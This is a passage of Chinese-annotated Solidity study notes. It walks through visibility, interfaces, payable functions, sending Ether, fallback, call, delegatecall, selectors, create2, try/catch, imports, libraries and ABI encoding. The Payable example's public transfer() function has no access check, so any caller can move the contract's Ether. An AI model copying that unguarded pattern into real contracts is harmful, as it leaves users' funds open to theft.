&quot;internal function called&quot;; } function testInternalFunc() public pure virtual returns (string memory) { return internalFunc(); } // Public functions can be called // - inside this contract // - inside contracts that inherit this contract // - by other contracts and accounts function publicFunc() public pure returns (string memory) { return &quot;public function called&quot;; } // External functions can only be called // - by other contracts and accounts function externalFunc() external pure returns (string memory) { return &quot;external function called&quot;; } // This function will not compile since we're trying to call // an external function here. // function testExternalFunc() public pure returns (string memory) { // return externalFunc(); // } // State variables string private privateVar = &quot;my private variable&quot;; string internal internalVar = &quot;my internal variable&quot;; string public publicVar = &quot;my public variable&quot;; // State variables cannot be external so this code won't compile. // string external externalVar = &quot;my external variable&quot;; } // Child 合约: 继承自 Base 合约。 // 注释掉的 testPrivateFunc 说明了子合约不能访问父合约的私有函数。 // testInternalFunc 展示了子合约可以访问并重写父合约的内部函数。 contract Child is Base { // Inherited contracts do not have access to private functions // and state variables. // function testPrivateFunc() public pure returns (string memory) { // return privateFunc(); // } // Internal function can be called inside child contracts. function testInternalFunc() public pure override returns (string memory) { return internalFunc(); } } 可见性修饰符控制了函数和状态变量的访问权限。 private 提供了最高的安全性，限制了访问权限。 internal 允许在继承结构中共享函数和状态变量。 public 允许任何合约和账户访问。 external 函数只能从外部调用，可以节省 gas。 正确使用可见性修饰符对于编写安全和高效的 Solidity 代码至关重要。 选择合适的可见性修饰符取决于具体的应用场景。 例如，如果一个函数只在合约内部使用，则应该声明为 private。 如果一个函数需要被子合约调用，则应该声明为 internal。 如果一个函数需要被其他合约调用，则应该声明为 public 或 external。 如果一个状态变量需要被其他合约读取，则应该声明为 public。 0x1B Interface 学习如何在 Solidity 中使用接口与其他合约交互。 接口的作用: 接口定义了合约的外部接口，类似于其他编程语言中的接口或抽象类。 通过接口，可以在不知道合约具体实现的情况下与之交互。 接口的特性: 不能实现任何函数: 接口只能声明函数，不能包含函数体。 可以继承其他接口: 类似于合约的继承，接口也可以继承其他接口。 所有声明的函数必须是 external 的: 因为接口定义的是外部接口。 不能声明构造函数: 接口不是合约，不需要构造函数。 不能声明状态变量: 接口不能存储状态。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; // 一个简单的计数器合约，包含一个计数变量 count 和一个递增函数 increment。 contract Counter { uint256 public count; function increment() external { count += 1; } } // 定义了 Counter 合约的接口，包含 count 和 increment 两个函数的声明。 // 合约名前面加个I就是对应的接口？ interface ICounter { // 和状态变量同名就是对应的getter？ function count() external view returns (uint256); function increment() external; } // 演示了如何使用接口与 Counter 合约交互。 contract MyContract { // incrementCounter 函数通过 ICounter(_counter).increment() 调用 Counter 合约的 increment 函数。 function incrementCounter(address _counter) external { ICounter(_counter).increment(); } // getCount 函数通过 ICounter(_counter).count() 获取 Counter 合约的 count 值。 function getCount(address _counter) external view returns (uint256) { return ICounter(_counter).count(); } } // 演示了如何使用接口与 Uniswap 协议交互。 // UniswapV2Factory 和 UniswapV2Pair 是 Uniswap 的两个接口。 // UniswapExample 合约使用这两个接口获取 DAI 和 WETH 的储备量。 // Uniswap example interface UniswapV2Factory { function getPair(address tokenA, address tokenB) external view returns (address pair); } interface UniswapV2Pair { function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast); } contract UniswapExample { address private factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; address private dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F; address private weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; function getTokenReserves() external view returns (uint256, uint256) { address pair = UniswapV2Factory(factory).getPair(dai, weth); (uint256 reserve0, uint256 reserve1,) = UniswapV2Pair(pair).getReserves(); return (reserve0, reserve1); } } Uniswap 协议？ 0x1C Payable 这个例子演示如何在 Solidity 中接收和发送以太币。 payable 关键字: payable 关键字用于标记可以接收以太币的地址和函数。 如果没有 payable 关键字，合约或函数将无法接收以太币。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract Payable { // 声明了一个名为 owner 的可支付地址类型的公共状态变量。 这意味着该地址可以接收以太币。 // Payable address can send Ether via transfer or send address payable public owner; // 构造函数: constructor() payable { ... } 声明了一个可支付的构造函数。 // 这意味着可以在创建合约时发送以太币到合约。 // 构造函数将发送者的地址存储在 owner 变量中。 // 注意 payable(msg.sender) 的用法，这是将 msg.sender （发送交易的地址）转换为可支付地址类型的必要步骤。 // Payable constructor can receive Ether constructor() payable { owner = payable(msg.sender); } // deposit 函数: 声明了一个可支付的公共函数。 // 这意味着可以调用该函数并发送以太币到合约。 // 合约的余额会自动更新。 // Function to deposit Ether into this contract. // Call this function along with some Ether. // The balance of this contract will be automatically updated. function deposit() public payable {} // 声明了一个非可支付的公共函数。 // 如果调用该函数并发送以太币，交易将会失败。 // Call this function along with some Ether. // The function will throw an error since this function is not payable. function notPayable() public {} // 将合约中存储的所有以太币发送给 owner。 // Function to withdraw all Ether from this contract. function withdraw() public { // get the amount of Ether stored in this contract uint256 amount = address(this).balance; // 获取合约的余额 // send all Ether to owner (bool success,) = owner.call{value: amount}(&quot;&quot;); // 将以太币发送给 owner。 require(success, &quot;Failed to send Ether&quot;); // 检查发送是否成功 } // Function to transfer Ether from this contract to address from input // 将指定数量的以太币从合约发送到指定的可支付地址 _to。 function transfer(address payable _to, uint256 _amount) public { // Note that &quot;to&quot; is declared as payable (bool success,) = _to.call{value: _amount}(&quot;&quot;); // 以太币发送给 _to require(success, &quot;Failed to send Ether&quot;); // 检查发送是否成功 } } .call{value: amount}(&quot;&quot;) : .call 是一个低级函数，用于调用其他合约的函数或发送以太币。 {value: amount} 指定发送的以太币数量。 (&quot;&quot;) 表示不传递任何数据。 .call 返回一个元组 (bool success, bytes memory data)，其中 success 表示调用是否成功，data 是返回的数据。 0x1D Sending Ether (transfer, send, call) 这个例子演示在 Solidity 中如何发送和接收以太币，以及如何防止重入攻击。 发送以太币的方式: 有三种方式可以将以太币发送到其他合约： transfer(): 只提供 2300 gas，如果交易失败会抛出错误。由于 gas 限制，不推荐使用这种方式。 send(): 也只提供 2300 gas，并返回一个布尔值表示交易是否成功。由于 gas 限制，也不推荐使用这种方式。 call(): 可以转发所有 gas 或设置 gas 限制，并返回一个布尔值表示交易是否成功。这是目前推荐的发送以太币的方式。 可以使用 {value: amount} 指定发送的以太币数量，例如 _to.call{value: msg.value}(&quot;&quot;)。 接收以太币的方式: 合约必须实现以下至少一个函数才能接收以太币： receive(): 当 msg.data 为空时调用，例如，直接发送以太币到合约地址。 必须声明为 external payable。 fallback(): 当 msg.data 不为空时调用，或者当合约没有匹配的函数时调用。 必须声明为 external payable。 推荐的发送以太币方式: 推荐使用 call() 结合重入锁来发送以太币，这是自 2019 年 12 月以来推荐的做法。 防止重入攻击: 重入攻击是一种常见的安全漏洞，攻击者可以通过反复调用合约的函数来窃取资金。 可以通过以下方式防止重入攻击： 在调用其他合约之前进行所有状态更改: 确保在发送以太币之前完成所有状态变量的更新。 使用重入锁修饰符: 使用一个修饰符来防止函数被重入。 一个简单的重入锁可以使用一个布尔变量来跟踪函数是否正在执行。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; // 演示了如何实现 receive() 和 fallback() 函数来接收以太币 contract ReceiveEther { /* Which function is called, fallback() or receive()? send Ether | msg.data is empty? / \\ yes no / \\ receive() exists? fallback() / \\ yes no / \\ receive() fallback() */ // Function to receive Ether. msg.data must be empty receive() external payable {} // Fallback function is called when msg.data is not empty fallback() external payable {} function getBalance() public view returns (uint256) { return address(this).balance; } } // 演示了使用 transfer()、send() 和 call() 发送以太币。 contract SendEther { function sendViaTransfer(address payable _to) public payable { // This function is no longer recommended for sending Ether. _to.transfer(msg.value); } function sendViaSend(address payable _to) public payable { // Send returns a boolean value indicating success or failure. // This function is not recommended for sending Ether. bool sent = _to.send(msg.value); require(sent, &quot;Failed to send Ether&quot;); } function sendViaCall(address payable _to) public payable { // Call returns a boolean value indicating success or failure. // This is the current recommended method to use. (bool sent, bytes memory data) = _to.call{value: msg.value}(&quot;&quot;); require(sent, &quot;Failed to send Ether&quot;); } } 0x1E Fallback 这个例子用来解释 Solidity 中 fallback 函数和 receive 函数的运作方式，以及如何使用它们来处理发送到合约的以太币和数据。 fallback 函数: fallback 函数是一个特殊的函数，它会在以下两种情况下被执行： 当调用合约中不存在的函数时。 当直接向合约发送以太币，但合约中不存在 receive 函数，或者 msg.data 不为空时。 receive 函数: receive 函数是 fallback 函数的一个变体，它只在 msg.data 为空时被调用，也就是当直接向合约发送以太币而没有携带任何数据时。 调用流程图: 提供的流程图清晰地展示了 receive 和 fallback 函数的调用逻辑： send Ether | msg.data is empty? / \\ yes no | | receive() exists? fallback() / \\ yes no | | receive() fallback() Gas 限制: 当通过 transfer 或 send 向合约发送以太币时，fallback 函数的 gas 限制为 2300。 这意味着 fallback 函数中不能执行复杂的计算。 如果需要执行更复杂的逻辑，应该使用 call 来发送以太币，因为它可以转发所有 gas 或设置自定义的 gas 限制。 fallback 函数的输入和输出: fallback 函数可以选择性地接受 bytes calldata 类型的输入参数，并返回 bytes memory 类型的输出。 这使得 fallback 函数可以处理更复杂的数据。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; // 演示如何实现 fallback 和 receive 函数，并使用事件记录 gas 消耗。 contract Fallback { event Log(string func, uint256 gas); // Fallback function must be declared as external. fallback() external payable { // send / transfer (forwards 2300 gas to this fallback function) // call (forwards all of the gas) emit Log(&quot;fallback&quot;, gasleft()); } // Receive is a variant of fallback that is triggered when msg.data is empty receive() external payable { emit Log(&quot;receive&quot;, gasleft()); } // Helper function to check the balance of this contract function getBalance() public view returns (uint256) { return address(this).balance; } } // 演示如何使用 transfer 和 call 向 Fallback 合约发送以太币。 contract SendToFallback { function transferToFallback(address payable _to) public payable { _to.transfer(msg.value); } function callFallback(address payable _to) public payable { (bool sent,) = _to.call{value: msg.value}(&quot;&quot;); require(sent, &quot;Failed to send Ether&quot;); } } 演示如何使用带有输入和输出的 fallback 函数来与其他合约交互，例如调用 Counter 合约的 get 和 inc 函数。 abi.encodeCall 用于编码函数调用数据。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; // TestFallbackInputOutput -&gt; FallbackInputOutput -&gt; Counter contract FallbackInputOutput { address immutable target; constructor(address _target) { target = _target; } fallback(bytes calldata data) external payable returns (bytes memory) { (bool ok, bytes memory res) = target.call{value: msg.value}(data); require(ok, &quot;call failed&quot;); return res; } } contract Counter { uint256 public count; function get() external view returns (uint256) { return count; } function inc() external returns (uint256) { count += 1; return count; } } contract TestFallbackInputOutput { event Log(bytes res); function test(address _fallback, bytes calldata data) external { (bool ok, bytes memory res) = _fallback.call(data); require(ok, &quot;call failed&quot;); emit Log(res); } function getTestData() external pure returns (bytes memory, bytes memory) { return (abi.encodeCall(Counter.get, ()), abi.encodeCall(Counter.inc, ())); // abi.encodeCall 用于编码函数调用数据 } } 0x1F Call 说明使用低级 call 函数与其他合约交互的优缺点，以及为什么它通常不是调用已知函数的推荐方法。 call 函数的用途: call 是一个低级函数，用于与其他合约交互。 当你只是想通过调用 fallback 函数发送以太币时，这是推荐的方法。 为什么不推荐使用低级 call 调用已知函数: 尽管 call 函数很灵活，但在调用已知函数时，它不是推荐的方法，主要有以下几个原因： 错误不会冒泡: 使用 call 调用其他合约的函数时，如果被调用函数发生错误（例如，require 语句失败或抛出异常），错误信息不会传递回调用方。 call 只返回一个布尔值，指示调用是否成功，而不提供具体的错误原因。 这使得调试变得更加困难。 绕过类型检查: call 绕过了 Solidity 的类型检查。 这意味着如果传递给被调用函数的参数类型不正确，编译器不会报错，而可能导致运行时错误或意外行为。 省略函数存在性检查: call 不会检查被调用函数是否存在。 如果尝试调用一个不存在的函数，fallback 函数会被触发。 这可能会导致意外的行为，特别是当你不期望调用 fallback 函数时。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; // Receiver 合约: 这个合约包含一个 fallback 函数和一个名为 foo 的函数。 这两个函数都会发出一个 Received 事件，记录调用者、发送的以太币数量和消息。 contract Receiver { event Received(address caller, uint256 amount, string message); fallback() external payable { emit Received(msg.sender, msg.value, &quot;Fallback was called&quot;); } function foo(string memory _message, uint256 _x) public payable returns (uint256) { emit Received(msg.sender, msg.value, _message); return _x + 1; } } // Caller 合约: 这个合约演示了如何使用 call 函数与 Receiver 合约交互。 contract Caller { event Response(bool success, bytes data); // testCallFoo 函数: 演示了如何使用 call 调用 Receiver 合约的 foo 函数，并发送以太币和自定义 gas 数量。 // 它使用 abi.encodeWithSignature 来编码函数签名和参数。 // Let's imagine that contract Caller does not have the source code for the // contract Receiver, but we do know the address of contract Receiver and the function to call. function testCallFoo(address payable _addr) public payable { // You can send ether and specify a custom gas amount (bool success, bytes memory data) = _addr.call{ value: msg.value, gas: 5000 }(abi.encodeWithSignature(&quot;foo(string,uint256)&quot;, &quot;call foo&quot;, 123)); emit Response(success, data); } // testCallDoesNotExist 函数: 演示了调用一个不存在的函数会触发 fallback 函数 // Calling a function that does not exist triggers the fallback function. function testCallDoesNotExist(address payable _addr) public payable { (bool success, bytes memory data) = _addr.call{value: msg.value}( abi.encodeWithSignature(&quot;doesNotExist()&quot;) ); emit Response(success, data); } } 0x20 Delegatecall delegatecall 的作用: delegatecall 是一个类似于 call 的低级函数，用于与其他合约交互。 然而，delegatecall 的独特之处在于，当合约 A 对合约 B 执行 delegatecall 时，B 的代码会在 A 的上下文 中执行。 这意味着： B 的代码使用 A 的存储: B 的代码会读取和修改 A 的存储变量，而不是 B 自己的存储。 msg.sender 是调用 A 的地址: 在 B 的代码执行期间，msg.sender 仍然是最初调用 A 的地址，而不是调用 delegatecall 的地址 (A)。 msg.value 保持不变: msg.value (发送的以太币数量) 保持不变，与调用 A 时相同。 delegatecall 与 call 的区别: call 函数在 B 的上下文 中执行 B 的代码。 这意味着 B 的代码会访问和修改 B 自己的存储，msg.sender 是 A 的地址，msg.value 是通过 call 发送的以太币数量。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; // B合约包含一个 setVars 函数，用于设置存储变量 num、sender 和 value // NOTE: Deploy this contract first contract B { // NOTE: storage layout must be the same as contract A uint256 public num; address public sender; uint256 public value; function setVars(uint256 _num) public payable { num = _num; sender = msg.sender; value = msg.value; } } // A合约也包含 num、sender 和 value 存储变量，并演示了如何使用 delegatecall 和 call 与 B 合约交互。 contract A { uint256 public num; address public sender; uint256 public value; event DelegateResponse(bool success, bytes data); event CallResponse(bool success, bytes data); // Function using delegatecall function setVarsDelegateCall(address _contract, uint256 _num) public payable { // 使用 delegatecall 调用 B 合约的 setVars 函数。 由于 delegatecall 在 A 的上下文中执行 B 的代码，因此会修改 A 的存储变量。 // A's storage is set; B's storage is not modified. (bool success, bytes memory data) = _contract.delegatecall( abi.encodeWithSignature(&quot;setVars(uint256)&quot;, _num) ); emit DelegateResponse(success, data); } // 使用 call 调用 B 合约的 setVars 函数。 由于 call 在 B 的上下文中执行 B 的代码，因此会修改 B 的存储变量。 // Function using call function setVarsCall(address _contract, uint256 _num) public payable { // B's storage is set; A's storage is not modified. (bool success, bytes memory data) = _contract.call{value: msg.value}( abi.encodeWithSignature(&quot;setVars(uint256)&quot;, _num) ); emit CallResponse(success, data); } } delegatecall 的应用场景和风险: delegatecall 常用于实现库（libraries）和可升级合约。 通过 delegatecall，可以将代码逻辑与存储分离，从而实现代码的复用和升级。 然而，delegatecall 也存在一些风险，尤其是在存储布局不一致的情况下。 如果 A 和 B 的存储布局不同，delegatecall 可能会导致数据损坏或意外行为。 因此，在使用 delegatecall 时，必须确保合约之间的存储布局兼容。 代码中的注释 // NOTE: storage layout must be the same as contract A 强调了这一点。 0x21 Function Selector 函数选择器的作用: 当调用一个合约的函数时，calldata 的前 4 个字节指定了要调用的函数。 这 4 个字节被称为函数选择器。 Solidity 使用函数选择器来确定要执行哪个函数。 如下所示，调用call来在addr地址上执行transfer函数。 addr.call(abi.encodeWithSignature(&quot;transfer(address,uint256)&quot;, 0xSomeAddress, 123)) 函数选择器的计算方法: 函数选择器是通过对函数签名进行 Keccak-256 哈希计算，然后取结果的前 4 个字节得到的。 函数签名是由函数名和参数类型组成，例如 &quot;transfer(address,uint256)&quot;。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract FunctionSelector { // getSelector函数接受一个字符串类型的函数签名作为输入， // 使用 `keccak256` 计算其哈希值，然后将结果转换为 `bytes4` 类型并返回。 /* &quot;transfer(address,uint256)&quot; 0xa9059cbb &quot;transferFrom(address,address,uint256)&quot; 0x23b872dd */ function getSelector(string calldata _func) external pure returns (bytes4) { return bytes4(keccak256(bytes(_func))); } } 预计算函数选择器: 代码中提到了一个优化技巧：预计算函数选择器并在代码中直接使用，可以节省少量 gas。 例如，与其在运行时使用 abi.encodeWithSignature(&quot;transfer(address,uint256)&quot;, 0xSomeAddress, 123) 来编码整个函数调用数据，不如直接使用预先计算好的选择器 0xa9059cbb，并手动编码剩余的参数。 示例： // 使用 abi.encodeWithSignature addr.call(abi.encodeWithSignature(&quot;transfer(address,uint256)&quot;, to, amount)); // 使用预计算的函数选择器 bytes4 selector = 0xa9059cbb; // transfer(address,uint256) addr.call(abi.encodeWithSelector(selector, to, amount)); 0x22 Calling Other Contract 两种调用方法： 直接调用: 这是最简单也是推荐的方法。 例如，A.foo(x, y, z) 直接调用合约 A 的 foo 函数，并传递参数 x、y 和 z。 低级调用 (Low-level call): 使用 address.call() 方法。 这种方法不推荐使用。 为什么不推荐低级调用： 低级调用 address.call() 虽然提供了更大的灵活性，但它也带来了一些风险，例如： 类型安全问题: 低级调用绕过了 Solidity 的类型检查，如果参数类型不匹配，可能会导致运行时错误。 错误处理问题: 低级调用不会自动传播错误。如果被调用合约的函数发生错误，调用方不会收到错误信息，这使得调试更加困难。 代码可读性差: 低级调用使得代码更难理解和维护。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract Callee { uint256 public x; uint256 public value; // `setX` 用于设置状态变量 `x` 的值 function setX(uint256 _x) public returns (uint256) { x = _x; return x; } // `setXandSendEther` 除了设置 `x` 之外，还会接收以太币并将 `msg.value` 存储在 `value` 变量中。 function setXandSendEther(uint256 _x) public payable returns (uint256, uint256) { x = _x; value = msg.value; return (x, value); } } // 演示如何调用 `Callee` 合约的函数 contract Caller { // 直接调用 `Callee` 合约的 `setX` 函数。 它接受一个 `Callee` 类型的参数 `_callee`，表示要调用的合约实例。 function setX(Callee _callee, uint256 _x) public { uint256 x = _callee.setX(_x); } // 通过地址调用 `Callee` 合约的 `setX` 函数。 // 它首先将地址 `_addr` 转换为 `Callee` 类型的合约实例，然后再调用 `setX` 函数。 // 这种方法也比较常见，但不如直接调用清晰。 function setXFromAddress(address _addr, uint256 _x) public { Callee callee = Callee(_addr); callee.setX(_x); } // 直接调用 `Callee` 合约的 `setXandSendEther` 函数，并发送以太币。 // {value: msg.value}: 用于指定发送给被调用函数的以太币数量。 function setXandSendEther(Callee _callee, uint256 _x) public payable { (uint256 x, uint256 value) = _callee.setXandSendEther{value: msg.value}(_x); } } 0x23 Contract that Creates other Contracts 这个例子学习如何在 Solidity 中使用 new 关键字创建合约，以及如何使用 create2 功能。 使用 new 关键字创建合约: 合约可以使用 new 关键字创建其他合约。 这类似于面向对象编程中的类的实例化。 create2 功能: 从 Solidity 0.8.0 版本开始，new 关键字支持 create2 功能。 create2 允许你预先计算新创建合约的地址，这在某些场景下非常有用，例如在链下计算合约地址，或者在合约部署之前就知道合约的地址。 create2 使用 salt 参数来影响合约地址的计算。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; // 这是一个简单的合约，表示一辆汽车， // 包含 `owner`（所有者）、`model`（型号）和 `carAddr`（合约地址）三个状态变量。 contract Car { address public owner; string public model; address public carAddr; constructor(address _owner, string memory _model) payable { owner = _owner; model = _model; carAddr = address(this); } } // 这是一个工厂合约，用于创建 `Car` 合约实例。 contract CarFactory { Car[] public cars; // 使用 `new Car(_owner, _model)` 创建一个新的 `Car` 合约实例，并将其添加到`cars` 数组中。 function create(address _owner, string memory _model) public { Car car = new Car(_owner, _model); cars.push(car); } // 该函数与 `create` 函数类似，但是它会向新创建的合约发送以太币。 `{value: msg.value}` 语法用于指定发送的以太币数量。 function createAndSendEther(address _owner, string memory _model) public payable { Car car = (new Car){value: msg.value}(_owner, _model); cars.push(car); } // 使用 `create2` 功能创建 `Car` 合约实例。 `{salt: _salt}` 指定了用于计算合约地址的盐值。 function create2(address _owner, string memory _model, bytes32 _salt) public { Car car = (new Car){salt: _salt}(_owner, _model); cars.push(car); } // 该函数结合了 `create2` 和发送以太币的功能 function create2AndSendEther( address _owner, string memory _model, bytes32 _salt ) public payable { Car car = (new Car){value: msg.value, salt: _salt}(_owner, _model); cars.push(car); } // 获取 `cars` 数组中指定索引的 `Car` 合约实例的信息，包括所有者、型号、合约地址和余额 function getCar(uint256 _index) public view returns ( address owner, string memory model, address carAddr, uint256 balance ) { Car car = cars[_index]; return (car.owner(), car.model(), car.carAddr(), address(car).balance); } } create2 的优势: 预先计算地址: 可以在合约部署之前就知道新合约的地址。 反事实实例化 (Counterfactual instantiation): 可以在不实际部署合约的情况下与合约交互。 更安全的合约创建: create2 可以防止某些类型的攻击，例如合约碰撞攻击。 0x24 Try Catch 这个例子学习 Solidity 中 try/catch 语句的使用，并强调了其局限性：只能捕获外部函数调用和合约创建过程中的错误。 它无法捕获内部函数调用或其他内部操作的错误。 try/catch 的作用: try/catch 语句用于处理外部函数调用和合约创建过程中可能发生的错误。 它允许你在发生错误时执行特定的代码，从而防止合约执行被中断。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; // 一个外部合约，用于演示 `try/catch` 的用法。 // 它的构造函数和 `myFunc` 函数都包含了错误处理逻辑 (`require` 和 `assert`)。 // External contract used for try / catch examples contract Foo { address public owner; constructor(address _owner) { require(_owner != address(0), &quot;invalid address&quot;); assert(_owner != 0x0000000000000000000000000000000000000001); owner = _owner; } function myFunc(uint256 x) public pure returns (string memory) { require(x != 0, &quot;require failed&quot;); return &quot;my func was called&quot;; } } // 包含两个使用 `try/catch` 的例子 contract Bar { event Log(string message); event LogBytes(bytes data); Foo public foo; constructor() { // new一个Foo合约的实例 // This Foo contract is used for example of try catch with external call foo = new Foo(msg.sender); } // 演示如何捕获外部函数调用的错误。 // 它调用 `Foo` 合约的 `myFunc` 函数。 // 如果 `myFunc` 执行成功，则发出 `Log` 事件，并包含 `myFunc` 的返回值。 // 如果 `myFunc` 抛出错误，则捕获错误并发出 `Log(&quot;external call failed&quot;)` 事件。 // Example of try / catch with external call // tryCatchExternalCall(0) =&gt; Log(&quot;external call failed&quot;) // tryCatchExternalCall(1) =&gt; Log(&quot;my func was called&quot;) function tryCatchExternalCall(uint256 _i) public { try foo.myFunc(_i) returns (string memory result) { emit Log(result); } catch { emit Log(&quot;external call failed&quot;); } } // 演示如何捕获合约创建过程中的错误。 // 该函数使用 `new Foo(_owner)` 创建一个新的 `Foo` 合约实例。 // 如果合约创建成功，则发出 `Log(&quot;Foo created&quot;)` 事件。 // 如果合约创建失败，则捕获错误并根据错误类型发出不同的事件 // Example of try / catch with contract creation // tryCatchNewContract(0x0000000000000000000000000000000000000000) =&gt; Log(&quot;invalid address&quot;) // tryCatchNewContract(0x0000000000000000000000000000000000000001) =&gt; LogBytes(&quot;&quot;) // tryCatchNewContract(0x0000000000000000000000000000000000000002) =&gt; Log(&quot;Foo created&quot;) function tryCatchNewContract(address _owner) public { try new Foo(_owner) returns (Foo foo) { // you can use variable foo here emit Log(&quot;Foo created&quot;); } catch Error(string memory reason) { // 捕获 `revert()` 和 `require()` 抛出的错误（带有字符串信息的错误） // catch failing revert() and require() emit Log(reason); // 并发出 `Log(reason)` 事件 } catch (bytes memory reason) { // 捕获 `assert()` 抛出的错误（原始字节码错误） // catch failing assert() emit LogBytes(reason); // 并发出 `LogBytes(reason)` 事件 } } } try/catch 的局限性: 代码中强调了 try/catch 的一个重要局限性：它只能捕获外部函数调用和合约创建过程中的错误。 它不能捕获内部函数调用或其他内部操作的错误。 例如，如果在 Bar 合约的内部函数中调用 Foo.myFunc，并且 myFunc 抛出错误，那么 try/catch 将无法捕获这个错误。 0x25 Import 这个例子学习如何在 Solidity 中导入本地和外部文件。 本地导入: Solidity 允许你导入位于同一项目目录下的文件。 示例中展示了如何从 Import.sol 文件导入 Foo.sol 文件。 目录结构: ├── Import.sol └── Foo.sol Foo.sol: 这个文件定义了一个结构体 Point，一个自定义错误 Unauthorized，一个函数 add，和一个合约 Foo。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; struct Point { uint256 x; uint256 y; } error Unauthorized(address caller); function add(uint256 x, uint256 y) pure returns (uint256) { return x + y; } contract Foo { string public name = &quot;Foo&quot;; } Import.sol: 这个文件导入了 Foo.sol 中的定义。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; // 导入了整个 `Foo.sol` 文件。 现在 `Import.sol` 可以访问 `Foo.sol` 中定义的所有内容。 // import Foo.sol from current directory import &quot;./Foo.sol&quot;; // 使用更精细的方式导入 `Foo.sol` 中的特定定义。 // 它导入了 `Unauthorized` 错误, `add` 函数 (并将其重命名为 `func`), 和 `Point` 结构体。 // 这种方式可以避免命名冲突，并减少编译后的合约大小。 // import {symbol1 as alias, symbol2} from &quot;filename&quot;; import {Unauthorized, add as func, Point} from &quot;./Foo.sol&quot;; contract Import { // 创建了一个 `Foo` 合约的实例 // Initialize Foo.sol Foo public foo = new Foo(); // 调用了 `Foo` 合约的 `name()` 函数。 // Test Foo.sol by getting it's name. function getFooName() public view returns (string memory) { return foo.name(); } } 外部导入: Solidity 还支持从外部资源（例如 GitHub）导入文件。 你可以直接使用文件的 URL 进行导入。 语法: import &quot;https://github.com/owner/repo/blob/branch/path/to/Contract.sol&quot;; // https://github.com/owner/repo/blob/branch/path/to/Contract.sol import &quot;https://github.com/owner/repo/blob/branch/path/to/Contract.sol&quot;; // Example import ECDSA.sol from openzeppelin-contract repo, release-v4.5 branch // https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.5/contracts/utils/cryptography/ECDSA.sol // 导入 OpenZeppelin Contracts 库中的 `ECDSA.sol` 文件 // 这允许你在你的合约中使用 OpenZeppelin 提供的 ECDSA 功能。 import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.5/contracts/utils/cryptography/ECDSA.sol&quot;; 0x26 Library 这个例子学习了 Solidity 中库的概念和用法，并提供了两个示例：Math 库和 Array 库。 库的概念: 库（Library）类似于合约，但有一些关键区别： 无状态变量: 库不能声明任何状态变量。这意味着库不能存储数据。 不能接收以太币: 你不能向库发送以太币。 嵌入式或部署式: 如果库的所有函数都是 internal 的，那么库的代码会被直接嵌入到使用它的合约中。否则，库必须先部署到区块链上，然后在部署使用它的合约时链接到该库。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; // 这个库提供了一个计算平方根的函数 `sqrt`。 library Math { // `internal pure` 关键字表示该函数只能在内部调用，并且不会修改状态。 function sqrt(uint256 y) internal pure returns (uint256 z) { if (y &gt; 3) { z = y; uint256 x = y / 2 + 1; while (x &lt; z) { z = x; x = (y / x + x) / 2; } } else if (y != 0) { z = 1; } // else z = 0 (default value) } } // 演示如何使用 `Math` 库 // 由于 `sqrt` 函数是 `internal` 的，`Math` 库的代码会被嵌入到 `TestMath` 合约中。 contract TestMath { function testSquareRoot(uint256 x) public pure returns (uint256) { return Math.sqrt(x); // 调用 Math 库的 sqrt 函数 } } // 这个库提供了一个从数组中移除元素的函数 `remove`。 // `storage` 关键字表示该函数直接操作调用合约的存储空间。 // `public` 关键字表示该函数可以被外部调用. 因为这个函数是 `public` 的，所以 `Array` 库需要先部署到区块链上。 // 所以是，库不能声明状态变量，但是参数可以是 // Array function to delete element at index and re-organize the array // so that there are no gaps between the elements. library Array { function remove(uint256[] storage arr, uint256 index) public { // Move the last element into the place to delete require(arr.length &gt; 0, &quot;Can't remove from empty array&quot;); arr[index] = arr[arr.length - 1]; arr.pop(); } } // 演示如何使用 `Array` 库 contract TestArray { // using关键字将库函数附加到uint256[]类型上 // 自定义一个Array类型，然后这里是把它转换为uint256[]，然后它的remove函数override了原本的remove函数？ using Array for uint256[]; uint256[] public arr; function testArrayRemove() public { // push3个元素到array for (uint256 i = 0; i &lt; 3; i++) { arr.push(i); } // 删除第二个元素 arr.remove(1); // 可以直接像调用数组自身的方法一样调用remove函数 assert(arr.length == 2); assert(arr[0] == 0); assert(arr[1] == 2); } } 库提供了一种在 Solidity 中实现代码复用的有效方式。 通过使用库，可以避免代码冗余，提高代码的可读性和可维护性。 根据库函数的可见性，库可以嵌入到合约中或部署为独立的合约。 using 关键字提供了一种更便捷的方式来使用库函数. 0x27 ABI Encode 这个例子学习如何在 Solidity 中使用 ABI 编码，并提供了使用 abi.encodeWithSignature、abi.encodeWithSelector 和 abi.encodeCall 三种方法的示例。 ABI 编码: ABI（Application Binary Interface）编码是 Solidity 中用于与合约交互的标准方式。 它定义了如何将函数调用和数据编码成字节数组，以便在区块链上进行传输和执行. abi.encodeCall 是推荐的 ABI 编码方法，因为它会在编译时进行类型检查，提高了代码的安全性。 abi.encodeWithSignature 需要手动指定函数签名和参数类型，容易出现拼写错误。 abi.encodeWithSelector 只编码函数选择器和参数，不进行类型检查，也容易出现错误。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; interface IERC20 { function transfer(address, uint256) external; } contract Token { function transfer(address, uint256) external {} } // `AbiEncode` 合约，其中包含三个函数，分别演示了不同的 ABI 编码方法。 contract AbiEncode { // 接收一个合约地址 `_contract` 和一个字节数组 `data`， // 并使用 `_contract.call(data)` 来调用指定合约的函数。 // `data` 参数包含了编码后的函数调用数据. function test(address _contract, bytes calldata data) external { (bool ok,) = _contract.call(data); require(ok, &quot;call failed&quot;); } // 使用 